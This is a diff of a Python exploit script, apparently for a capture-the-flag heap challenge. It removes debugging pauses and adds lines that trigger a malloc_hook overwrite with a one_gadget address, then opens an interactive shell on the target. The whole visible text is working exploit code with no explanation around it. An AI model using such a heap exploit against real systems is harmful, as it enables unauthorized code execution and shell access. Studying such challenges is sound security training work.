@@ -93,14 +93,15 @@ print hex(target)
 
 #malloc to malloc_hook@upper!
 
-raw_input("before allocated!")
 allocate(0x60)
 allocate(0x60)
 
 #print dump("9")
 payload = "\x00" * offset + p64(one_gadget)
 fill("9", len(payload), payload,i=1)
-raw_input("hello!")
+p.sendline("1")
+print p.recv()
+p.sendline("1")
 p.interactive()
 
 
